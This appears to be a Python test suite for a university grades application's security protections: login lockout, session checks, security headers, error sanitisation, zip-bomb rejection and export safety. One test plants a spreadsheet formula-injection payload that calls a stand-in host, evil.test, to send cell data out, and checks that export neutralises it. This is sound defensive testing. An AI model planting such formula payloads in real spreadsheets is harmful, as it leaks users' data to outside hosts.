"""Protecciones de seguridad: fuerza bruta, sesiones, cabeceras, límites y datos expuestos."""

import io
import zipfile
from datetime import UTC, datetime, timedelta

import jwt
import pytest
from openpyxl import Workbook, load_workbook
from pydantic import SecretStr, ValidationError

from app import reset_db, seed_db
from app.core.config import Settings, get_settings
from app.models import ChatChannel, Role, User
from app.services import conversations, excel
from app.services.notification_stream import broker
from app.telegram.handlers import TelegramBotService
from tests.conftest import active_token
from tests.factories import names
from tests.import_helpers import upload, xlsx
from tests.test_auth import bearer, login_staff, login_student


@pytest.fixture
def few_login_failures(monkeypatch):
    monkeypatch.setattr(get_settings(), "login_max_failures_per_account", 3)
    monkeypatch.setattr(get_settings(), "login_max_failures_per_ip", 100)


# --- Fuerza bruta en el login ------------------------------------------------


async def test_login_bloquea_la_cuenta_tras_varios_fallos(client, create_user, few_login_failures):
    await create_user(Role.TEACHER, email="profe@uni.edu")
    for _ in range(3):
        assert (await login_staff(client, "profe@uni.edu", "mala")).status_code == 401
    # Bloqueada: ni siquiera la contraseña correcta sirve hasta que pase la ventana
    blocked = await login_staff(client, "PROFE@uni.edu")
    assert blocked.status_code == 429
    assert int(blocked.headers["Retry-After"]) > 0
    assert "Demasiados intentos" in blocked.json()["detail"]
    # Las demás cuentas siguen entrando
    await create_user(Role.COORDINATOR, email="coord@uni.edu")
    assert (await login_staff(client, "coord@uni.edu")).status_code == 200


async def test_login_correcto_reinicia_los_fallos(client, create_user, few_login_failures):
    await create_user(Role.STUDENT, cedula=4242)
    for _ in range(2):
        assert (await login_student(client, 4242, password="mala")).status_code == 401
    assert (await login_student(client, 4242)).status_code == 200
    for _ in range(2):
        assert (await login_student(client, 4242, password="mala")).status_code == 401
    assert (await login_student(client, 4242)).status_code == 200


async def test_limite_por_ip_frena_probar_muchas_cuentas(client, monkeypatch):
    monkeypatch.setattr(get_settings(), "login_max_failures_per_ip", 3)
    for cedula in range(1, 4):
        assert (await login_student(client, cedula, password="x")).status_code == 401
    assert (await login_student(client, 99, password="x")).status_code == 429


async def test_cambiar_contrasena_tiene_limite_de_intentos(client, login_as, few_login_failures):
    headers = await login_as(Role.TEACHER, email="profe@uni.edu")
    wrong = {"current_password": "mala", "new_password": "nueva-clave-123"}
    for _ in range(3):
        response = await client.post("/auth/change-password", json=wrong, headers=headers)
        assert response.status_code == 400
    response = await client.post("/auth/change-password", json=wrong, headers=headers)
    assert response.status_code == 429


# --- Contraseña generada pendiente de cambiar --------------------------------


async def test_con_contrasena_generada_solo_puede_cambiarla(client, create_user):
    await create_user(Role.TEACHER, email="nuevo@uni.edu", must_change_password=True)
    token = (await login_staff(client, "nuevo@uni.edu")).json()["access_token"]
    headers = bearer(token)

    blocked = await client.get("/teacher/subjects", headers=headers)
    assert blocked.status_code == 403
    assert "cambiar tu contraseña" in blocked.json()["detail"]
    assert (await client.get("/auth/me", headers=headers)).status_code == 200

    change = {"current_password": "secreta123", "new_password": "nueva-clave-123"}
    response = await client.post("/auth/change-password", json=change, headers=headers)
    assert response.status_code == 204
    token = (await login_staff(client, "nuevo@uni.edu", "nueva-clave-123")).json()["access_token"]
    assert (await client.get("/teacher/subjects", headers=bearer(token))).status_code == 200


# --- Inicio de sesión con huella ----------------------------------------------


def old_token(user: User, minutes: int = 11) -> str:
    """Token válido emitido hace `minutes` minutos."""
    settings = get_settings()
    issued = datetime.now(UTC) - timedelta(minutes=minutes)
    payload = {
        "sub": str(user.id),
        "role": user.role.value,
        "iat": issued,
        "exp": issued + timedelta(hours=1),
        "jti": f"viejo-{minutes}",
        "ver": user.token_version,
    }
    return jwt.encode(payload, settings.jwt_secret_key.get_secret_value(), algorithm="HS256")


async def test_huella_con_sesion_vieja_pide_la_contrasena(client, create_user):
    user = await create_user(Role.STUDENT, cedula=7)
    headers = bearer(old_token(user))

    response = await client.post("/auth/biometric", headers=headers)
    assert response.status_code == 403
    assert "Confirma tu contraseña" in response.json()["detail"]

    wrong = await client.post("/auth/biometric", json={"current_password": "mala"}, headers=headers)
    assert wrong.status_code == 400

    ok = await client.post(
        "/auth/biometric", json={"current_password": "secreta123"}, headers=headers
    )
    assert ok.status_code == 201


async def test_huella_recien_iniciada_no_pide_contrasena(client, create_user):
    await create_user(Role.STUDENT, cedula=8)
    token = (await login_student(client, 8)).json()["access_token"]
    assert (await client.post("/auth/biometric", headers=bearer(token))).status_code == 201


async def test_huella_lista_y_limita_los_telefonos(client, create_user):
    await create_user(Role.STUDENT, cedula=9)
    headers = bearer((await login_student(client, 9)).json()["access_token"])
    ids = [
        (await client.post("/auth/biometric", headers=headers)).json()["device_id"]
        for _ in range(6)
    ]
    devices = (await client.get("/auth/biometric", headers=headers)).json()
    # Como mucho 5: el más antiguo se borró al activar el sexto
    assert [d["id"] for d in devices] == list(reversed(ids[1:]))
    assert set(devices[0]) == {"id", "created_at", "last_used_at"}


async def test_huella_con_id_enorme_no_rompe(client):
    response = await client.post("/auth/login/biometric", json={"credential": "9" * 60 + ".x"})
    assert response.status_code == 401


# --- Cabeceras, tamaños y errores ----------------------------------------------


async def test_cabeceras_de_seguridad(client):
    response = await client.get("/health")
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["x-frame-options"] == "DENY"
    assert response.headers["referrer-policy"] == "no-referrer"
    assert response.headers["cache-control"] == "no-store"
    assert "frame-ancestors 'none'" in response.headers["content-security-policy"]


async def test_peticion_demasiado_grande_se_rechaza_antes_de_leerla(client, course):
    limit = get_settings().max_request_bytes
    response = await client.post(
        f"/teacher/subjects/{course['subject_id']}/grades/import",
        content=b"x" * 16,
        headers={**course["headers"], "Content-Length": str(limit + 1)},
    )
    assert response.status_code == 413


async def test_error_422_no_devuelve_lo_enviado(client):
    secret = "corta"
    response = await client.post(
        "/setup",
        json={**names("Ana Admin"), "email": "a@uni.edu", "password": secret},
    )
    assert response.status_code == 422
    assert secret not in response.text
    assert response.json()["detail"][0]["loc"] == ["body", "password"]


async def test_error_500_generico_y_con_cors(client, monkeypatch):
    from app.services import setup as setup_service

    async def broken(_db):
        raise RuntimeError("SELECT secreto FROM users")

    monkeypatch.setattr(setup_service, "is_installed", broken)
    origin = get_settings().cors_origins_list[0]
    response = await client.get("/setup/status", headers={"Origin": origin})
    assert response.status_code == 500
    assert "secreto" not in response.text
    assert response.json()["request_id"] == response.headers["x-request-id"]
    assert response.headers["access-control-allow-origin"] == origin


# --- Configuración ------------------------------------------------------------


def test_no_arranca_con_debug_en_produccion():
    with pytest.raises(ValidationError, match="DEBUG"):
        Settings(app_env="production", debug=True, jwt_secret_key=SecretStr("x" * 40))


def test_documentacion_oculta_en_produccion():
    production = Settings(app_env="production", debug=False, jwt_secret_key=SecretStr("x" * 40))
    assert production.docs_enabled is False
    assert Settings(app_env="development").docs_enabled is True
    forced = Settings(
        app_env="production",
        debug=False,
        jwt_secret_key=SecretStr("x" * 40),
        api_docs_enabled=True,
    )
    assert forced.docs_enabled is True


def test_algoritmo_jwt_restringido():
    with pytest.raises(ValidationError):
        Settings(jwt_algorithm="none")


def test_scripts_de_datos_no_tocan_produccion(monkeypatch):
    monkeypatch.setattr(get_settings(), "app_env", "production")
    assert reset_db.main(["--yes"]) == 1
    assert seed_db.run() == 1


# --- Instalador -----------------------------------------------------------------


async def test_instalador_con_codigo(client, monkeypatch):
    monkeypatch.setattr(get_settings(), "setup_token", SecretStr("codigo-secreto"))
    assert (await client.get("/setup/status")).json()["token_required"] is True
    body = {**names("Ana Admin"), "email": "a@uni.edu", "password": "clave-segura-1"}

    assert (await client.post("/setup", json=body)).status_code == 403
    wrong = await client.post("/setup", json=body, headers={"X-Setup-Token": "otro"})
    assert wrong.status_code == 403
    ok = await client.post("/setup", json=body, headers={"X-Setup-Token": "codigo-secreto"})
    assert ok.status_code == 201


async def test_instalador_en_produccion_exige_codigo(client, monkeypatch):
    monkeypatch.setattr(get_settings(), "app_env", "production")
    body = {**names("Ana Admin"), "email": "a@uni.edu", "password": "clave-segura-1"}
    response = await client.post("/setup", json=body)
    assert response.status_code == 403
    assert "SETUP_TOKEN" in response.json()["detail"]


# --- Búsquedas ------------------------------------------------------------------


async def test_busqueda_trata_los_comodines_como_texto(client, login_as, create_user):
    coord = await login_as(Role.COORDINATOR, email="coord@uni.edu")
    await create_user(Role.TEACHER, email="ana@uni.edu", full_name="Ana Pérez")
    listed = await client.get("/teachers", params={"q": "%"}, headers=coord)
    assert listed.json()["items"] == []
    too_long = await client.get("/teachers", params={"q": "a" * 101}, headers=coord)
    assert too_long.status_code == 422
    digits = await client.get("/students", params={"q": "9" * 5000}, headers=coord)
    assert digits.status_code == 422


# --- Excel ------------------------------------------------------------------------


def test_zip_bomb_se_rechaza():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("xl/worksheets/sheet1.xml", b"\0" * (excel.MAX_UNCOMPRESSED_BYTES + 1))
    with pytest.raises(excel.InvalidSpreadsheetError, match="descomprimido"):
        excel.read_workbook(buffer.getvalue())


def test_solo_se_leen_las_primeras_filas_y_columnas():
    wb = Workbook()
    wb.active.append(["Cédula", "Nota"])
    wb.active.cell(row=excel.MAX_SCAN_ROWS + 10, column=1, value="oculta")
    wb.active.cell(row=1, column=excel.MAX_SCAN_COLUMNS + 10, value="lejos")
    buffer = io.BytesIO()
    wb.save(buffer)
    [sheet] = excel.read_workbook(buffer.getvalue())
    assert sheet.rows == [(1, ["Cédula", "Nota"])]


def test_archivo_danado_es_error_400():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("[Content_Types].xml", "<no-es-xml")
    with pytest.raises(excel.InvalidSpreadsheetError):
        excel.read_workbook(buffer.getvalue())


async def test_exportar_no_convierte_nombres_en_formulas(client, campus, session):
    ana = await session.get(User, campus["students"]["Ana"]["id"])
    ana.last_name = '=HYPERLINK("https://evil.test/?"&A5,"Ver")'
    await session.commit()
    mat = campus["subjects"]["MAT-101"]
    response = await client.get(
        f"/teacher/subjects/{mat['id']}/grades/export",
        headers=campus["teachers"]["Pedro Profe"],
    )
    sheet = load_workbook(io.BytesIO(response.content))["Planilla"]
    cells = [c for row in sheet.iter_rows() for c in row if str(c.value).startswith("=")]
    assert cells and all(c.data_type == "s" for c in cells)


# --- Autorización -------------------------------------------------------------


async def test_importaciones_ocultas_al_perder_la_materia(client, course, login_as):
    job_id = (await upload(client, course)).json()["id"]
    coord = await login_as(Role.COORDINATOR, email="coord2@uni.edu")
    teacher_id = (await client.get("/auth/me", headers=course["headers"])).json()["id"]
    await client.put(f"/teachers/{teacher_id}/subjects", json={"subject_ids": []}, headers=coord)

    detail = await client.get(f"/teacher/import-jobs/{job_id}", headers=course["headers"])
    assert detail.status_code == 404
    assert (await client.get("/teacher/import-jobs", headers=course["headers"])).json() == []


async def test_no_se_borra_una_materia_de_un_periodo_cerrado(client, login_as):
    coord = await login_as(Role.COORDINATOR, email="coord@uni.edu")
    semester = (await client.post("/semesters", json={"name": "2020-I"}, headers=coord)).json()
    subject = await client.post(
        "/subjects",
        json={"semester_id": semester["id"], "code": "HIS-1", "name": "Historia"},
        headers=coord,
    )
    await client.post(f"/semesters/{semester['id']}/close", headers=coord)
    response = await client.delete(f"/subjects/{subject.json()['id']}", headers=coord)
    assert response.status_code == 409


# --- Avisos en tiempo real y chat -------------------------------------------------


async def test_limite_de_conexiones_a_los_avisos(client, campus, monkeypatch):
    monkeypatch.setattr(broker, "connections", lambda _user_id: 3)
    response = await client.get(
        "/student/notifications/stream", headers=campus["students"]["Ana"]["headers"]
    )
    assert response.status_code == 429


class FakeLLM:
    async def run_tools(self, messages, tools, call_tool):
        return "ok"


async def test_telegram_limita_la_longitud_de_la_pregunta(sessionmaker, session, campus):
    ana = await session.get(User, campus["students"]["Ana"]["id"])
    ana.telegram_chat_id = 555
    await session.commit()
    await conversations.create(session, ana.id, ChatChannel.TELEGRAM)

    bot = TelegramBotService(sessionmaker, FakeLLM)
    assert "demasiado larga" in await bot.message(555, "?" * 1001)
    assert await bot.message(555, "¿Cómo voy?") == "ok"


async def test_estudiante_activo_tras_cambiar_contrasena(client, session, course):
    # Sanidad del helper de los tests: la cuenta queda lista para usar la API
    student_id = next(iter(course["students"].values()))
    token = await active_token(session, student_id)
    assert (await client.get("/student/subjects", headers=bearer(token))).status_code == 200


def test_xlsx_helper_sigue_siendo_valido():
    assert excel.read_workbook(xlsx([["a", "b"]]))[0].rows == [(1, ["a", "b"])]
